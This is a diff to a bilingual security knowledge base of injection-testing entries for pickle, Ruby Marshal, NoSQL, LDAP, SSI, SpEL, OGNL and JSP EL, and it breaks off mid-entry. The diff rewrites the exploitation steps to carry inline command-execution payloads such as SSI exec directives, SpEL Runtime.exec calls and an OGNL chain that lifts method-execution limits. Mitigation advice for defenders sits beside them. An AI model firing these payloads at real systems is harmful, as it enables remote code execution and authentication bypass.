@@ -1,6 +1,6 @@
 {
   "schemaVersion": 1,
-  "contentStandard": 2,
+  "contentStandard": 3,
   "sourcePrefix": "nosql2",
   "entries": [
     {
@@ -23,20 +23,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Pickle 是 Python 对象图传输格式，不是面向不可信输入的安全数据格式。本条用于确认字节流是否真正到达 Pickle 解释器，并把普通解码、对象重建异常与可调用对象执行区分开；结论必须同时依赖响应、应用日志和受控副作用证据。",
-          "en": "Pickle transports Python object graphs and is not a safe format for untrusted input. This review confirms whether bytes reach the Pickle interpreter and separates ordinary decoding, reconstruction errors, and callable execution by correlating responses, logs, and a controlled side effect."
+          "zh": "Python Pickle 不安全反序列化针对不可信 Pickle 字节流进入 load/loads 的场景：对象重建阶段可解析任意全局对象并调用可执行函数。验证 GLOBAL 与 REDUCE 指令流是否被真正反序列化执行。",
+          "en": "Unsafe Python Pickle deserialization targets untrusted pickle byte streams entering load/loads, where object reconstruction can resolve arbitrary globals and invoke executable functions. It validates whether GLOBAL and REDUCE opcode streams are truly deserialized and executed."
         },
         "vulnerability": {
-          "zh": "Pickle 的 GLOBAL、REDUCE 等操作码可以解析模块成员并在反序列化期间调用函数；格式本身不提供来源认证或类型隔离。若网络请求、缓存、任务队列或上传文件中的数据未经可信校验便进入 Unpickler，攻击者可借应用依赖中的可调用对象构造执行链。",
-          "en": "Pickle opcodes such as GLOBAL and REDUCE can resolve module members and invoke functions during deserialization. The format provides no origin authentication or type isolation, so data from requests, caches, queues, or uploads can reach application callables when passed to an Unpickler without a trust check."
+          "zh": "根因是网络请求、缓存、任务队列或上传文件中的数据未经可信校验便进入 Unpickler；Pickle 的 GLOBAL、REDUCE 等操作码可解析模块成员并在反序列化期间调用函数，格式本身不提供来源认证。",
+          "en": "The root cause is data from network requests, caches, task queues, or uploads entering the Unpickler without trusted validation; pickle opcodes like GLOBAL and REDUCE resolve module members and invoke functions during deserialization, and the format provides no origin authentication."
         },
         "exploitation": {
-          "zh": "步骤一用应用自己生成的简单字典建立成功反序列化基线并记录对象类型；步骤二在隔离测试进程中提交本条命令集合中的一个受控样本，观察子进程审计、容器事件和应用异常；步骤三追加损坏字节流与仅 Base64 解码的对照，排除日志关键字命中、下游 Shell 或缓存旧结果造成的假阳性。",
-          "en": "First deserialize an application-generated dictionary and record the resulting type. Next submit one controlled sample from the listed command corpus to an isolated test process and observe child-process audit events, container telemetry, and application exceptions. Finally compare malformed bytes and a Base64-only control to exclude log matching, a downstream shell, or cached output as false positives."
+          "zh": "按第 1 步逐条提交 cos system 的 REDUCE 指令流（payload 形式为 os.system 包裹 whoami/id 等命令），记录响应与日志差异；命中判据为反序列化执行后响应或副作用出现对应命令输出。确认执行能力后可读取标记文件形成证据；Base64 传输的入口先解码再提交。注意区分普通解码错误、对象重建异常与真正函数调用三种现象。",
+          "en": "Submit the cos-system REDUCE opcode streams one by one per step 1 (payloads wrapping whoami/id-style commands in os.system), recording response and log differences; a hit is the corresponding command output appearing in responses or side effects after deserialization. Once execution is confirmed, read a marker file for evidence; decode Base64-transported entries before submitting. Distinguish ordinary decode errors, object-reconstruction exceptions, and genuine function invocation."
         },
         "mitigation": {
-          "zh": "第一，跨信任边界改用 JSON 等只表达数据的格式；第二，拒绝对外部输入调用 pickle.load 或 pickle.loads，并对历史队列执行来源认证和迁移；第三，以最低权限隔离仍需读取的遗留数据，限制文件和网络访问，同时监控反序列化异常与异常子进程。",
-          "en": "Use a data-only format such as JSON across trust boundaries. Never call pickle.load or pickle.loads on external input, and authenticate and migrate legacy queues. Isolate unavoidable legacy readers with least privilege, restricted filesystem and network access, and monitoring for deserialization errors and child processes."
+          "zh": "跨信任边界改用 JSON 等只表达数据的格式；拒绝对外部输入调用 pickle.load 或 pickle.loads，并对历史队列执行来源认证和迁移；以最低权限隔离仍需读取的遗留数据。修复后重放第 1 步指令流，确认被拒绝且业务数据读取正常。",
+          "en": "Switch to data-only formats like JSON across trust boundaries; refuse pickle.load/pickle.loads on external input, and authenticate origins and migrate historical queues; isolate legacy data that must still be read with least privilege. After the fix, replay the step-1 opcode streams and confirm rejection while business data reads work normally."
         },
         "difficulty": "advanced"
       },
@@ -135,20 +135,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Marshal 能保存 Ruby 特有的类和对象状态，适合受信任进程之间交换兼容对象，却不承诺安全解析任意来源。本条审校关注数据是否进入 Marshal.load、加载了哪些类、是否执行 marshal_load 或 _load 回调，并用运行时证据区分简单 Base64 解码与真正对象实例化。",
-          "en": "Marshal preserves Ruby-specific classes and object state for trusted peers but does not promise safe parsing of arbitrary sources. This review tracks data into Marshal.load, records instantiated classes and marshal_load or _load callbacks, and distinguishes Base64 decoding from actual object construction with runtime evidence."
+          "zh": "Ruby Marshal 不安全对象加载针对外部可控 Marshal 数据被直接加载的场景：对象恢复过程会触发 marshal_load/_load 回调与依赖库 gadget。验证 Base64 Marshal 串能否进入 Marshal.load 并执行。",
+          "en": "Unsafe Ruby Marshal loading targets externally controllable Marshal data loaded directly, where object restoration triggers marshal_load/_load callbacks and dependency gadgets. It validates whether Base64 Marshal strings reach Marshal.load and execute."
         },
         "vulnerability": {
-          "zh": "Marshal 流可以指定类、实例变量和对象关系，加载器会解析应用进程当前可见的常量，并执行对象定义的恢复逻辑。只要签名 Cookie、作业参数或缓存条目可被外部修改，依赖中的危险回调就可能在业务校验之前运行；仅检查编码形式无法建立可信边界。",
-          "en": "A Marshal stream can name classes, instance variables, and object relationships. The loader resolves constants visible to the process and runs object restoration logic. If signed cookies, job arguments, or cache entries can be modified, dangerous callbacks in dependencies may run before business validation; checking only the encoding does not establish trust."
+          "zh": "根因是签名 Cookie、作业参数或缓存条目可被外部修改并进入 Marshal.load；Marshal 流可指定类、实例变量和对象关系，加载器会解析进程可见常量并执行对象定义的恢复逻辑，依赖中的危险回调在业务校验之前运行。",
+          "en": "The root cause is externally modifiable signed cookies, job arguments, or cache entries reaching Marshal.load; Marshal streams specify classes, instance variables, and object relations, and the loader resolves process-visible constants and executes restoration logic, so dangerous dependency callbacks run before business validation."
         },
         "exploitation": {
-          "zh": "先用本地 Marshal.dump 生成的字符串、数组和业务对象记录类型与耗时基线；再在禁网的测试容器中提交原始编码集合，关联 Ruby 异常、类加载和进程事件；最后用随机 Base64、版本不匹配流和不经过 Marshal.load 的接口作对照，排除仅解码成功、统一错误页或后台旧任务导致的假阳性。",
-          "en": "Begin with strings, arrays, and business objects produced by Marshal.dump and record type and timing baselines. Then submit the original encoded corpus in a network-isolated container and correlate Ruby exceptions, class loading, and process events. Compare random Base64, a version-mismatched stream, and an endpoint that never calls Marshal.load to exclude decoding success, generic error pages, or stale jobs as false positives."
+          "zh": "按第 1 步逐条提交 Base64 编码的 Marshal 串（内嵌 cmd 参数构造的对象链），记录响应与日志差异；命中判据为 Marshal.load 执行后返回对应命令输出（id/whoami 等）。确认加载能力后可替换为读取标记文件的等价对象链形成证据；注意区分 Base64 解码错误、未知类异常与真正对象实例化三种现象，并核对加载的类清单。",
+          "en": "Submit the Base64-encoded Marshal strings one by one per step 1 (object chains embedding cmd-argument constructs), recording response and log differences; a hit is the corresponding command output (id/whoami) returned after Marshal.load executes. Once loading is confirmed, substitute equivalent object chains reading marker files for evidence; distinguish Base64 decode errors, unknown-class exceptions, and genuine object instantiation, and audit the loaded class list."
         },
         "mitigation": {
-          "zh": "优先把外部交换格式迁移为 JSON 或显式字段协议；对必须保留的 Marshal 数据使用服务端密钥认证并在消费前验证完整性和版本；缩小加载进程的依赖、权限与网络访问，拒绝未知来源数据，同时为 Marshal.load 调用和异常类实例化建立审计。",
-          "en": "Prefer JSON or an explicit field protocol for external exchange. Authenticate unavoidable Marshal data with a server-held key and verify integrity and version before consumption. Minimize dependencies, privileges, and network access in the loader, reject unknown sources, and audit Marshal.load calls and unexpected class construction."
+          "zh": "优先把外部交换格式迁移为 JSON 或显式字段协议；对必须保留的 Marshal 数据使用服务端密钥认证并在消费前验证完整性和版本；缩小加载进程的依赖、权限与网络访问，并为 Marshal.load 调用和异常类实例化建立审计。修复后重放第 1 步串，确认被拒绝。",
+          "en": "Prefer migrating external exchange formats to JSON or explicit field protocols; protect mandatory Marshal data with server-side key authentication and verify integrity and version before consumption; shrink loader-process dependencies, permissions, and network access, and audit Marshal.load calls and anomalous class instantiation. After the fix, replay the step-1 strings and confirm rejection."
         },
         "difficulty": "advanced"
       },
@@ -247,20 +247,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "该问题常见于应用把 JSON 请求体直接展开到 MongoDB 风格查询对象的场景。测试目标不是看到某个操作符字符串被接受，而是证明客户端能够改变服务端谓词结构，并导致认证主体、结果集合或访问范围出现可重复差异；必须保留正常失败登录和未知用户作为对照。",
-          "en": "This issue commonly appears when an application spreads a JSON body directly into a MongoDB-style query object. The goal is not merely to see an operator string accepted, but to prove the client can alter predicate structure and repeatedly change the authenticated principal, result set, or access scope, with failed login and unknown-user controls."
+          "zh": "覆盖 NoSQL 操作符注入的认证绕过验证：对认证字段提交 Infinity、$gt/$gte/$ne/$lt/$lte 值域、$in/$nin 大名单与 $regex 模式。适用于登录或查询 API 接受客户端对象型条件的场景。",
+          "en": "Covers authentication-bypass verification for NoSQL operator injection: submitting Infinity, $gt/$gte/$ne/$lt/$lte ranges, $in/$nin bulk lists, and $regex patterns against authentication fields. Suitable for login or query APIs accepting client-supplied object conditions."
         },
         "vulnerability": {
-          "zh": "服务端期望用户名和密码是字符串，却未在进入数据库驱动前固定类型与允许字段，导致对象中的特殊键被驱动解释为查询操作符。若认证代码只检查查询是否返回任意文档，攻击者可把精确匹配改写为非等于、范围或正则条件，并绕过原有凭据比较。",
-          "en": "The server expects username and password strings but fails to constrain types and allowed fields before the database driver. Special keys are then interpreted as query operators. If authentication checks only whether any document is returned, exact credential matching can become inequality, range, or regular-expression logic."
+          "zh": "根因是服务端期望用户名和密码是字符串却未固定类型与允许字段，对象中的特殊键被驱动解释为查询操作符；认证代码只检查返回任意文档时，精确匹配即被改写为非等于或范围条件。",
+          "en": "The root cause is servers expecting string username/password without pinning types or allowed fields, so special keys inside objects are interpreted by the driver as query operators; when auth code only checks that any document returns, exact matches are rewritten into non-equality or range conditions."
         },
         "exploitation": {
-          "zh": "步骤一用正确用户名加错误密码记录 401、响应体、会话 Cookie 与数据库查询基线；步骤二每次只提交一种原始操作符结构，检查是否获得真实用户身份并核对数据库审计中的谓词；步骤三使用不存在的用户名、空集合和被模式校验拒绝的对象作对照，排除测试账号免密、开发后门、缓存会话或统一 200 页面造成的假阳性。",
-          "en": "First use a valid username with a wrong password and record the 401 response, body, session cookie, and database predicate. Next submit one original operator structure at a time and verify any returned identity against database audit logs. Finally compare an unknown username, an empty result, and a schema-rejected object to exclude passwordless test accounts, development bypasses, cached sessions, or generic 200 pages as false positives."
+          "zh": "使用第 1 步命令对认证字段逐行提交 Infinity、值域、大名单与 $regex 变体；某行绕过密码校验返回登录成功即确认对应操作符认证绕过成立。先用正确用户名加错误密码记录 401 基线，每次只提交一种操作符结构并核对数据库审计中的谓词与命中身份。",
+          "en": "Use the step 1 command to submit Infinity, range, bulk-list, and $regex variants against authentication fields line by line; a row bypassing password checks and returning login success confirms that operator's authentication bypass. Record a 401 baseline with correct username plus wrong password first, submitting one operator structure per attempt and checking predicates and matched identity in database audit."
         },
         "mitigation": {
-          "zh": "对认证和查询 DTO 执行严格 JSON Schema 校验，只允许标量类型与已声明字段；由服务端代码显式构造数据库谓词，禁止把请求对象直接传给 find、findOne 等接口；启用对象键清洗、最小数据库权限、失败认证限速，并监控包含操作符键的异常请求。",
-          "en": "Apply strict JSON Schema validation to authentication and query DTOs, allowing only declared scalar fields. Build database predicates explicitly on the server and never pass request objects directly to find or findOne. Add operator-key sanitization, least database privilege, failed-authentication rate limits, and monitoring for operator-bearing requests."
+          "zh": "对认证与查询 DTO 执行严格 JSON Schema 校验只允许标量与已声明字段，服务端显式构造数据库谓词，禁止把请求对象直接传给 find/findOne；启用对象键清洗、认证限速并监控含操作符键的请求。",
+          "en": "Enforce strict JSON Schema validation on auth and query DTOs allowing only scalars and declared fields, construct database predicates explicitly server-side, and never pass request objects straight into find/findOne; enable object-key scrubbing, auth rate limits, and monitoring of operator-keyed requests."
         },
         "difficulty": "intermediate"
       },
@@ -356,20 +356,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "LDAP 注入发生在应用动态拼接目录过滤器或 DN，而不是使用明确的属性和值绑定。本条命令集合包含过滤器闭合、逻辑分支和属性通配符变体；评估时要证明返回条目数、匹配身份或目录服务器日志中的过滤器发生变化，不能把搜索框原本支持的通配查询误判为漏洞。",
-          "en": "LDAP injection occurs when an application dynamically concatenates a directory filter or distinguished name instead of binding a defined attribute and value. The corpus contains filter termination, logical branches, and attribute wildcards. Prove a change in result count, matched identity, or the directory-server filter, and do not misclassify an intentionally supported wildcard search."
+          "zh": "覆盖 LDAP 过滤器注入验证：)(&、)(| 等过滤器闭合变体作用于用户属性，检测括号、逻辑运算符与通配符能否改变目录检索或认证条件。适用于动态拼接 LDAP 过滤器或 DN 的入口。",
+          "en": "Covers LDAP filter injection verification: filter-closure variants like )(& and )(| applied to user attributes, testing whether parentheses, logical operators, and wildcards can alter directory searches or authentication conditions. Suitable for entries concatenating LDAP filters or DNs dynamically."
         },
         "vulnerability": {
-          "zh": "LDAP 过滤器具有括号、与或非运算和星号通配语义。若应用仅做 HTML 或 URL 编码，却没有按过滤器值和 DN 两种上下文分别转义，攻击者输入就可闭合当前条件并插入新的目录表达式。查询账号权限过大时，影响还会扩展到额外属性和组织单元。",
-          "en": "LDAP filters have parentheses, Boolean operators, and wildcard semantics. HTML or URL encoding does not replace context-specific escaping for filter values and distinguished names, so input can terminate the intended condition and add a new directory expression. Overprivileged bind accounts expand exposure to more attributes and organizational units."
+          "zh": "根因是应用仅做 HTML 或 URL 编码却未按过滤器值与 DN 两种上下文分别转义，攻击输入可闭合当前条件并插入新目录表达式；绑定账号权限过大时影响扩展到额外属性与组织单元。",
+          "en": "The root cause is applications applying only HTML or URL encoding without context-specific escaping for filter values versus DNs, letting input close the current condition and insert new directory expressions; over-privileged bind accounts extend impact to extra attributes and OUs."
         },
         "exploitation": {
-          "zh": "先用一个精确存在和一个不存在的目录账号记录结果数量与服务端过滤器；再逐项提交原始变体，比较匹配身份、属性范围和 LDAP 审计日志；最后在明确允许通配搜索的接口、只做前缀搜索的正常值以及转义后的同一输入上复测，排除产品设计、目录别名或缓存结果造成的假阳性。",
-          "en": "Record result counts and server-side filters for one existing and one nonexistent directory identity. Submit original variants individually and compare matched identities, attribute scope, and LDAP audit logs. Retest on an endpoint that intentionally supports wildcards, a normal prefix search, and the escaped equivalent to exclude product design, directory aliases, or cached results as false positives."
+          "zh": "使用第 1 步命令逐行提交 )(&、)(| 等过滤器闭合变体；出现过滤器错误、返回条目异常增多或查询结构改变即确认 LDAP 过滤器可注入。先用一个精确存在与一个不存在的账号记录结果数量与服务端过滤器基线，再逐项比较匹配身份、属性范围与 LDAP 审计日志。",
+          "en": "Use the step 1 command to submit filter-closure variants like )(& and )(| line by line; filter errors, abnormally increased results, or changed query structure confirm injectable LDAP filters. Baseline result counts and server-side filters with one exactly-existing and one nonexistent account first, then compare matched identities, attribute scope, and LDAP audit logs per variant."
         },
         "mitigation": {
-          "zh": "使用支持参数绑定或安全过滤器构造的目录 API；分别按照 LDAP Filter 与 DN 规则转义所有外部值，并对可查询属性设置允许列表；限制绑定账号可见的组织单元和属性，统一认证失败响应，同时记录异常括号、通配符和大结果集查询。",
-          "en": "Use directory APIs that support binding or safe filter construction. Escape every external value according to LDAP Filter and DN rules separately, and allowlist searchable attributes. Limit the bind account's visible organizational units and attributes, normalize authentication failures, and log anomalous parentheses, wildcards, and large-result queries."
+          "zh": "使用支持参数绑定或安全过滤器构造的目录 API，按 LDAP Filter 与 DN 规则分别转义所有外部值，可查询属性设置允许列表；限制绑定账号可见范围，统一认证失败响应并记录异常查询。",
+          "en": "Use directory APIs supporting parameter binding or safe filter construction, escape all external values per LDAP Filter and DN rules separately, and allowlist queryable attributes; restrict bind-account visibility, unify auth-failure responses, and log abnormal queries."
         },
         "difficulty": "intermediate"
       },
@@ -465,20 +465,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "SSI 指令由 Web 服务器在返回 HTML 前处理，只有内容进入启用了 Includes 的资源类型或目录时才会生效。本条用于区分注释文本回显、模板层处理和真正的服务器 SSI 解析；证据应包括响应中的受控标记、服务器模块配置、访问日志以及可能的子进程事件。",
-          "en": "SSI directives are processed by the web server before HTML is returned and execute only when content reaches a resource type or directory with Includes enabled. This entry separates reflected comments, template processing, and real SSI parsing using a controlled response marker, module configuration, access logs, and any child-process telemetry."
+          "zh": "Server-Side Includes 指令注入针对可控内容被启用 SSI 的 Web 服务器再次解析的场景：exec、include、echo 等指令可读取文件、泄露环境信息或启动命令。验证 exec cmd 类指令在指令位置的执行。",
+          "en": "Server-Side Includes directive injection targets controllable content being re-parsed by SSI-enabled web servers, where exec, include, and echo directives can read files, leak environment info, or launch commands. It validates exec cmd-style directives executing at the directive position."
         },
         "vulnerability": {
-          "zh": "应用允许用户内容进入 .shtml、动态错误页或启用 SSI 的发布目录，同时服务器保留 exec 或文件包含能力，输入便从普通文本提升为服务端控制指令。仅做 HTML 编码可能改变浏览器解释，却无法阻止服务器在编码前阶段识别 SSI 注释语法。",
-          "en": "User content may reach .shtml files, dynamic error pages, or published directories with SSI enabled while the server still permits exec or file inclusion. Input then becomes a server directive rather than text. Browser-oriented HTML encoding does not prevent the server from recognizing SSI comment syntax earlier in the response pipeline."
+          "zh": "应用允许用户内容进入 .shtml、动态错误页或启用 SSI 的发布目录，同时服务器保留 exec 或文件包含能力，输入便从普通文本提升为服务端控制指令；仅做 HTML 编码无法阻止服务器在编码前识别 SSI 语法。",
+          "en": "Applications letting user content enter .shtml, dynamic error pages, or SSI-enabled publish directories, combined with servers retaining exec or file-include capability, escalate input from plain text into server-side directives; HTML encoding alone cannot stop the server recognizing SSI syntax before encoding."
         },
         "exploitation": {
-          "zh": "步骤一提交普通 HTML 注释并确认页面只按字面返回；步骤二在隔离虚拟主机选择一个无破坏性的原始指令样本，记录响应标记、SSI 模块日志和进程审计；步骤三用未启用 SSI 的扩展名、反向代理缓存清空和不存在文件作对照，排除静态回显、旧缓存或应用自身模板变量造成的假阳性。",
-          "en": "First submit an ordinary HTML comment and confirm literal output. Next choose one non-destructive original directive in an isolated virtual host and record the response marker, SSI module logs, and process audit events. Finally compare a non-SSI extension, a cleared reverse-proxy cache, and a missing file to exclude static reflection, stale cache entries, or application template variables as false positives."
+          "zh": "按第 1 步把 <!--#exec cmd=\"id\"--> 等指令注入目标接受的输入字段（评论、文件名、头部等）并请求渲染页面；命中判据为页面在指令位置插入命令输出或文件内容，证明服务器在返回前解析了 SSI。逐条记录指令类型与输出位置，区分注释文本回显、模板层处理与真正的服务器解析；exec 被禁用时改测 echo 与 include 指令并单独评估影响。",
+          "en": "Inject <!--#exec cmd=\"id\"--> and similar directives into input fields the target accepts (comments, filenames, headers) per step 1 and request the rendered page; a hit is command output or file content inserted at the directive position, proving the server parsed SSI before returning. Record directive type and output position per sample, distinguishing comment-text echo, template-layer handling, and genuine server parsing; when exec is disabled, test echo and include directives instead and assess impact separately."
         },
         "mitigation": {
-          "zh": "在不需要的站点和目录禁用 SSI，尤其关闭 IncludesNOEXEC 之外的执行能力；把用户上传与生成内容放入不解析脚本和 SSI 的独立域及存储；对必须支持的占位符使用应用级固定模板，限制文件系统权限，并告警包含 SSI 指令特征的请求与发布内容。",
-          "en": "Disable SSI in sites and directories that do not require it, and avoid exec-capable configurations. Serve user uploads and generated content from a separate origin and storage that parses neither scripts nor SSI. Use fixed application templates for required placeholders, restrict filesystem privileges, and alert on SSI directive signatures in requests and published content."
+          "zh": "在不需要的站点和目录禁用 SSI，尤其关闭 IncludesNOEXEC 之外的执行能力；把用户上传与生成内容放入不解析脚本和 SSI 的独立域及存储；对必须支持的占位符使用应用级固定模板。修复后重放第 1 步指令，确认输出为字面文本且无解析痕迹。",
+          "en": "Disable SSI where unneeded, especially closing execution beyond IncludesNOEXEC; place user uploads and generated content in separate domains and storage that parse neither scripts nor SSI; use application-level fixed templates for required placeholders. After the fix, replay the step-1 directives and confirm literal text output with no parsing traces."
         },
         "difficulty": "advanced"
       },
@@ -574,20 +574,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "SpEL 本身是 Spring 的合法表达式能力，风险取决于谁控制表达式文本、使用何种 EvaluationContext，以及暴露了哪些类型和方法。本条审校要求先证明输入被服务端求值，再逐层确认属性访问、类型解析和方法调用边界，避免把字符串插值或前端模板计算误认为 SpEL 注入。",
-          "en": "SpEL is a legitimate Spring expression feature. Risk depends on who controls expression text, which EvaluationContext is used, and which types and methods are exposed. This review first proves server-side evaluation and then checks property access, type resolution, and method invocation, avoiding confusion with string interpolation or client-side templates."
+          "zh": "Spring SpEL 表达式注入针对外部输入被 SpEL 解析器求值的场景：类型引用、方法调用或上下文对象访问可突破业务表达式范围。验证 T(java.lang.Runtime) 与 ProcessBuilder 两类样例的求值执行。",
+          "en": "Spring SpEL expression injection targets external input evaluated by the SpEL parser, where type references, method invocation, or context-object access can break business expression scope. It validates evaluation and execution of T(java.lang.Runtime) and ProcessBuilder sample classes."
         },
         "vulnerability": {
-          "zh": "应用把请求参数、规则内容或数据库字段交给 SpelExpressionParser，并使用可访问类型定位器和方法解析器的标准上下文。若缺少表达式允许列表与受限上下文，T() 类型引用和对象方法可把数据求值扩展为任意 Java API 调用，最终继承应用进程权限。",
-          "en": "The application passes request parameters, rule text, or stored fields to SpelExpressionParser with a standard context that exposes type and method resolvers. Without an expression allowlist and restricted context, T() references and object methods can expand data evaluation into arbitrary Java API calls with the application's privileges."
+          "zh": "应用把请求参数、规则内容或数据库字段交给 SpelExpressionParser 并使用可访问类型定位器和方法解析器的标准上下文；缺少表达式允许列表与受限上下文时，T() 类型引用可把数据求值扩展为任意 Java API 调用并继承应用进程权限。",
+          "en": "The application passes request parameters, rule content, or database fields to SpelExpressionParser with a standard context exposing type locators and method resolvers; without expression allowlists and restricted contexts, T() type references expand data evaluation into arbitrary Java API calls inheriting the application process's privileges."
         },
         "exploitation": {
-          "zh": "先提交普通字符串和常量算术表达式，记录响应值与 SpEL 解析日志；再在隔离实例使用原始集合中的一个受控方法调用，关联 Java 子进程、异常栈和请求 ID；最后对比未进入 SpEL 的相同文本、缓存清理后的响应和只允许属性读取的 SimpleEvaluationContext，排除反射回显、缓存以及其他模板引擎造成的假阳性。",
-          "en": "Submit plain text and a constant arithmetic expression and record response values and SpEL parser logs. In an isolated instance, use one controlled method call from the original corpus and correlate Java child-process events, stack traces, and request IDs. Compare identical text outside SpEL, a cache-cleared response, and a property-only SimpleEvaluationContext to exclude reflection, caching, or another template engine as false positives."
+          "zh": "按第 1 步逐条提交 ${T(java.lang.Runtime).getRuntime().exec('pwd')} 与 ProcessBuilder 变体到目标表达式入口；命中判据为表达式求值执行命令并返回输出（id 的 uid=）。注意 exec 直接输出不回显时改用输出重定向或外带方式取回；确认可达后逐层记录类型解析与方法调用能力，区分模板插值与 SpEL 求值两种现象。",
+          "en": "Submit ${T(java.lang.Runtime).getRuntime().exec('pwd')} and ProcessBuilder variants one by one to the target expression entry per step 1; a hit is the expression evaluating the command and returning output (uid= from id). When direct exec output is not echoed, use output redirection or out-of-band retrieval; after confirming reachability, record type-resolution and method-invocation capabilities layer by layer, distinguishing template interpolation from SpEL evaluation."
         },
         "mitigation": {
-          "zh": "不要把用户输入作为表达式源码；业务确需表达式时，使用 SimpleEvaluationContext 或自定义受限上下文，只暴露固定变量、属性和函数；禁用类型引用、构造器与反射访问，运行于最低权限，并记录解析失败、异常类型访问和方法调用。",
-          "en": "Do not use user input as expression source. When expressions are required, use SimpleEvaluationContext or a custom restricted context exposing only fixed variables, properties, and functions. Disable type references, constructors, and reflection, run with least privilege, and log parser failures, unusual type access, and method invocation."
+          "zh": "不要把用户输入作为表达式源码；业务确需表达式时使用 SimpleEvaluationContext 或自定义受限上下文，只暴露固定变量、属性和函数；禁用类型引用、构造器与反射访问，运行于最低权限，并记录解析失败与异常类型访问。修复后重放第 1 步样例，确认 T() 被拒绝。",
+          "en": "Never use user input as expression source; when expressions are required, use SimpleEvaluationContext or a custom restricted context exposing only fixed variables, properties, and functions; disable type references, constructors, and reflective access, run least-privileged, and log parse failures and anomalous type access. After the fix, replay the step-1 samples and confirm T() is rejected."
         },
         "difficulty": "advanced"
       },
@@ -690,20 +690,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "OGNL 是 Struts 数据绑定和视图处理中的表达式语言，不同漏洞由参数名、Content-Type、标签属性或异常处理路径触发。本条不是通用 Struts 指纹表，而是验证外部数据是否进入 OGNL 求值器，并以响应计算、Struts 日志和 JVM 行为确认表达式执行层级。",
-          "en": "OGNL is used by Struts for data binding and view processing, while different flaws are triggered through parameter names, content types, tag attributes, or error paths. This entry is not a generic Struts fingerprint list; it validates whether external data reaches the OGNL evaluator and measures execution through response calculations, Struts logs, and JVM behavior."
+          "zh": "Apache Struts OGNL 注入针对请求处理链把可控值解释为 OGNL 表达式的场景：可覆盖成员访问限制、解析 Java 类型或调用运行时方法。验证 denyMethodExecution 关闭与 Runtime 调用的完整链。",
+          "en": "Apache Struts OGNL injection targets request-processing chains interpreting controlled values as OGNL expressions, able to override member-access restrictions, resolve Java types, or invoke runtime methods. It validates the full chain of disabling denyMethodExecution through Runtime invocation."
         },
         "vulnerability": {
-          "zh": "受影响的 Struts 组件在安全边界前构造或二次求值 OGNL 表达式，某些路径还允许修改 memberAccess 或访问静态 Java 成员。攻击者因此可从属性导航扩大到任意对象图和方法调用。可利用性高度依赖具体 Struts 版本、插件、拦截器和请求映射，不能仅凭框架存在下结论。",
-          "en": "Affected Struts components construct or reevaluate OGNL expressions before a security boundary, and some paths permit memberAccess changes or static Java access. Property navigation can therefore expand into arbitrary object graphs and method invocation. Exploitability depends on the exact Struts version, plugin, interceptor, and request mapping, so framework presence alone is insufficient."
+          "zh": "受影响的 Struts 组件在安全边界前构造或二次求值 OGNL 表达式，某些路径还允许修改 memberAccess 或访问静态 Java 成员；可利用性高度依赖具体 Struts 版本、插件、拦截器和请求映射，不能仅凭框架存在下结论。",
+          "en": "Affected Struts components construct or re-evaluate OGNL expressions before the security boundary, and some paths allow modifying memberAccess or accessing static Java members; exploitability depends heavily on the exact Struts version, plugins, interceptors, and request mapping—the framework's presence alone is not a conclusion."
         },
         "exploitation": {
-          "zh": "步骤一从错误页、响应头和依赖清单确认 Struts 版本及可疑入口；步骤二先用无副作用常量表达式建立求值证据，再在隔离环境提交一个原始方法调用样本并关联 JVM 子进程与 Struts 日志；步骤三向非 Struts 路由、修补版本和仅反射参数的接口发送相同文本，排除 WAF 回显、统一异常页或其他 EL 引擎造成的假阳性。",
-          "en": "First identify the Struts version and candidate entry point from errors, headers, and dependencies. Establish evaluation with a side-effect-free constant, then submit one original method-call sample in isolation and correlate JVM child processes with Struts logs. Send the same text to a non-Struts route, a patched version, and a reflection-only parameter to exclude WAF echoes, generic exception pages, or another expression engine as false positives."
+          "zh": "按第 1 步的多阶段表达式逐段提交：先以 denyMethodExecution=false 关闭方法执行限制，再以 DEFAULT_MEMBER_ACCESS 替换成员访问，最后经 Runtime.getRuntime().exec('id') 执行命令；命中判据为 OGNL 求值返回对应输出。逐阶段记录放行与拦截结果，定位生效触发点（参数名、Content-Type 等），并绑定具体 Struts 版本评估可用性。",
+          "en": "Submit the multi-stage expressions of step 1 segment by segment: first disable method-execution restrictions with denyMethodExecution=false, then replace member access with DEFAULT_MEMBER_ACCESS, finally run commands via Runtime.getRuntime().exec('id'); a hit is OGNL evaluation returning corresponding output. Record pass/block per stage to locate the effective trigger (parameter name, Content-Type), and assess usability bound to the exact Struts version."
         },
         "mitigation": {
-          "zh": "升级到 Apache Struts 当前受支持且已修复的版本并移除不必要插件；不要动态构造或二次求值 OGNL，限制可绑定参数与 Action 属性；采用最小权限运行、阻断不必要出站访问，并监控 OGNL 解析异常、memberAccess 修改和异常 Java 进程创建。",
-          "en": "Upgrade to a currently supported Apache Struts release containing relevant fixes and remove unnecessary plugins. Never construct or reevaluate OGNL dynamically, and restrict bindable parameters and Action properties. Run with least privilege, block unnecessary egress, and monitor OGNL parser errors, memberAccess changes, and unusual Java process creation."
+          "zh": "升级到受支持且已修复的 Struts 版本并移除不必要插件；不动态构造或二次求值 OGNL，限制可绑定参数与 Action 属性；最小权限运行并监控 OGNL 解析异常与异常进程创建。修复后重放第 1 步全链，确认各阶段被拦截。",
+          "en": "Upgrade to supported, fixed Struts versions and remove unneeded plugins; never dynamically construct or re-evaluate OGNL, restrict bindable parameters and Action properties; run least-privileged and monitor OGNL parse anomalies and anomalous process creation. After the fix, replay the step-1 full chain and confirm every stage is blocked."
         },
         "difficulty": "expert"
       },
@@ -799,20 +799,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "JSP EL 通常在服务端渲染阶段解析 ${} 或 #{}，但同样语法也可能由前端框架、配置替换器或日志模板处理。本条审校通过常量计算、对象访问与方法调用三个层级确认真正的 JSP EL 数据流，并要求将响应结果与 Servlet 容器日志、线程和类加载证据关联。",
-          "en": "JSP EL normally resolves ${} or #{} during server-side rendering, but similar syntax may be processed by client frameworks, configuration substitution, or log templates. This review checks constant evaluation, object access, and method invocation in stages and correlates responses with servlet-container logs, threads, and class-loading evidence."
+          "zh": "JSP Expression Language 注入针对不可信数据被 JSP EL 求值器作为表达式执行的场景：pageContext、ELResolver 与反射可访问超出展示需求的对象。验证 getClass().forName 链到 Runtime 执行。",
